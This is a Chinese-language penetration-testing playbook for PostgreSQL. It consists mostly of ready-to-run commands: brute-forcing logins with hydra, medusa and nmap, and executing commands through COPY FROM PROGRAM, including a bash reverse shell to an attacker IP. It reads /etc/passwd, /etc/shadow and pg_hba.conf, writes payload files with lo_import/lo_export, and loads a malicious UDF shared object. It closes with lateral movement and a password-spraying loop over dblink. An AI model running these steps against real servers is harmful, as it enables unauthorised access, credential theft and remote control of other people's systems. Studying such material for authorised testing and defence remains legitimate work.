# 05-PostgreSQL渗透

> PostgreSQL 的利用核心：超级用户可执行 `COPY TO PROGRAM` 直接 RCE，且大对象机制天然支持任意文件读写。前置见 [[01-数据库渗透流程与探测|01章]]。

## 目录
- [[#一、弱口令爆破|一、弱口令爆破]]
- [[#二、COPY TO PROGRAM执行命令|二、COPY TO PROGRAM执行命令]]
- [[#三、pg_read_file与pg_ls_dir读文件|三、pg_read_file与pg_ls_dir读文件]]
- [[#四、大对象lo_import/lo_export读写任意文件|四、大对象lo_import/lo_export读写任意文件]]
- [[#五、UDF编译so提权思路|五、UDF编译so提权思路]]
- [[#六、CVE-2019-9193|六、CVE-2019-9193]]
- [[#七、横向dblink与postgres_fdw|七、横向dblink与postgres_fdw]]

---

## 一、弱口令爆破

```bash
# hydra（模块 postgres）
hydra -l postgres -P pass.txt -s 5432 <target> postgres

# medusa
medusa -h <target> -u postgres -P pass.txt -M postgres

# nmap pgsql-brute
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=pass.txt <target>

# 命中后连接
psql -h <target> -U postgres -W
PGPASSWORD='postgres' psql -h <target> -U postgres -c '\l'
```

常见弱口令：`postgres/postgres`、`postgres/123456`、`postgres/postgres123`。另注意 `pg_hba.conf` 若配置为 `trust` 则任何口令都能登录，等于无认证。

---

## 二、COPY TO PROGRAM执行命令

**所需权限：超级用户（postgres）。** `COPY ... TO/FROM PROGRAM` 把输出交给 shell 执行：

```sql
-- 执行命令并把结果写进表里回显
CREATE TABLE cmdout(line text);
COPY cmdout FROM PROGRAM 'id';
SELECT * FROM cmdout;

-- 常用探测组合
COPY cmdout FROM PROGRAM 'cat /etc/passwd';
COPY cmdout FROM PROGRAM 'ls -la /var/www/html';
COPY cmdout FROM PROGRAM 'uname -a';

-- 反弹 shell（bash 可用环境）
COPY cmdout FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<攻击IP>/4444 0>&1"';
```

Windows 服务端同样适用，命令换为对应 CMD 语法。

版本说明：9.3 引入该特性；11 之后仍存在但始终要求 superuser；`pg_execute_server_program` 角色成员亦可调用（见第六节的 CVE 场景）。

---

## 三、pg_read_file与pg_ls_dir读文件

```sql
-- 超级用户读取任意路径
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');

-- 遍历目录列表
SELECT pg_ls_dir('/etc/');
SELECT pg_ls_dir('/var/www/html/');

-- 读二进制（大版本差异：pg_read_binary_file）
SELECT pg_read_binary_file('/etc/shadow');   -- 仅超管
```

非超级用户只能读 `data_directory` 下文件（PG12 前行为）或被授予 `pg_read_server_files` 角色。

---

## 四、大对象lo_import/lo_export读写任意文件

即使 `COPY` 被 WAF/审计拦截，大对象 API 仍是可靠的文件通道（需超级用户）：

```sql
-- 读服务器文件到本地攻击机：先 import 成大对象，再 export 到可访问位置
SELECT lo_import('/etc/passwd', 10001);
SELECT lo_export(10001, '/tmp/stolen.txt');

-- 写文件到服务器任意路径（配合反弹 shell 脚本落地）
SELECT lo_import('/tmp/local_evil.sh', 10002);
SELECT lo_export(10002, '/var/tmp/evil.sh');
```

通过 psql 客户端更直接：

```bash
psql -h <target> -U postgres
\lo_import /etc/passwd 10001
\lo_export 10001 ./passwd_local.txt
```

---

## 五、UDF编译so提权思路

PostgreSQL 本身不支持 MySQL 式 `CREATE FUNCTION ... SONAME` 动态加载，但 **C 语言扩展**机制等效：

1. 目标机器上（或同架构同系统版本环境）用 PG 头文件编译恶意扩展 so，参考开源项目 `lib_postgresqludf_sys`（提供 sys_exec/sys_eval 函数）。
2. 通过第四节的大对象或 `COPY` 把 so 写入服务器可写目录。
3. `CREATE FUNCTION sys_exec(text) RETURNS int AS '/tmp/udf_sys.so','sys_exec' LANGUAGE C;`
4. `SELECT sys_exec('id > /tmp/o');`

限制苛刻：需要超级用户 + so 与服务端 ABI 兼容 + 文件落盘可行。多数场景下第二节 `COPY FROM PROGRAM` 更省事，此路作为被禁 COPY 时的备份手段。

---

## 六、CVE-2019-9193

严格说这是"配置风险"而非代码漏洞：管理员按官方文档示例创建了带口令的 `pg_read_server_files` 等效角色并暴露端口时，低权限账户即可执行 `COPY FROM PROGRAM`。

```sql
-- 判定当前用户能否触发（无需超管的场景）
SELECT current_user;
-- 若属于 pg_execute_server_program 角色（PG11+）：
COPY cmdout FROM PROGRAM 'whoami';
```

判定流程：拿到任意凭据 → 尝试 `COPY FROM PROGRAM` → 成功即 RCE，失败再走第七节横向。红队价值在于提醒运维不要照搬官方示例创建宽松角色。

---

## 七、横向dblink与postgres_fdw

命中一台 PostgreSQL 后，用它作为跳板枚举内网其他库：

```sql
-- 启用 dblink 扩展
CREATE EXTENSION IF NOT EXISTS dblink;

-- 探测内网其他 PG 并测试凭据复用
SELECT * FROM dblink('host=<内网IP> port=5432 user=postgres password=postgres',
                     'SELECT version()') AS t(v text);

-- postgres_fdw 持久化外部服务器映射
CREATE EXTENSION IF NOT EXISTS postgres_fdw;
CREATE SERVER ext_srv FOREIGN DATA WRAPPER postgres_fdw 
    OPTIONS (host '<内网IP>', port '5432', dbname 'postgres');
CREATE USER MAPPING FOR postgres SERVER ext_srv OPTIONS (user 'postgres', password 'postgres');
```

配合口令字典批量尝试 `dblink` 连接，等价于 MSSQL 的链接服务器横向（参见 [[03-MSSQL渗透|03-MSSQL渗透]] 第九节）。

```sql
-- dblink 配合口令字典的批量验证思路（PL/pgSQL 循环）
DO $$
DECLARE
    pw text;
BEGIN
    FOREACH pw IN ARRAY ARRAY['postgres','123456','password'] LOOP
        BEGIN
            PERFORM * FROM dblink('host=<内网IP> port=5432 user=postgres password='||pw,
                                  'SELECT 1') AS t(i int);
            RAISE NOTICE 'HIT: %', pw;
            EXIT;
        EXCEPTION WHEN OTHERS THEN NULL;   -- 失败继续下一个口令
        END;
    END LOOP;
END $$;
```

---

## 八、pg_hba.conf与配置侦察

登录前/后都值得关注的认证与安全配置：

| 配置项 | 红队关注点 |
|--------|-----------|
| `pg_hba.conf` | 出现 `trust` 行 = 免密直连；`md5/cram-md5` 可离线破解 |
| `listen_addresses` | `'*'` 说明对外监听 |
| `logging_collector` | 日志是否开启，决定操作留痕程度 |
| `unix_socket_directories` | 本地提权时可借 socket 直连绕过 TCP 限制 |

```sql
-- 登录后读取认证配置（超级用户）
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');
SELECT setting FROM pg_settings WHERE name IN ('data_directory','config_file');
```

Windows 服务端补充：PostgreSQL 服务常以 `NT AUTHORITY\NetworkService` 运行，`COPY TO PROGRAM` 拿到的即该账户权限；数据目录默认 `C:\Program Files\PostgreSQL\<版本>\data\`，其中 `postgresql.conf` 与日志均可经第三节函数读取。

---

## 九、利用路径决策小结

| 场景条件 | 首选路径 |
|---------|---------|
| 超管凭据 + 任意版本 | COPY TO PROGRAM（第二节） |
| 超管 + COPY 被禁 | 大对象 lo_export 落 so → UDF（第四、五节） |
| 低权限凭据 | 先试 CVE-2019-9193 角色，失败转 dblink 横向 |
| 仅未授权读文件 | pg_read_file 翻 pg_hba.conf 与 Web 配置 |

---
**返回** [[数据库安全总目录|数据库安全 总目录]]
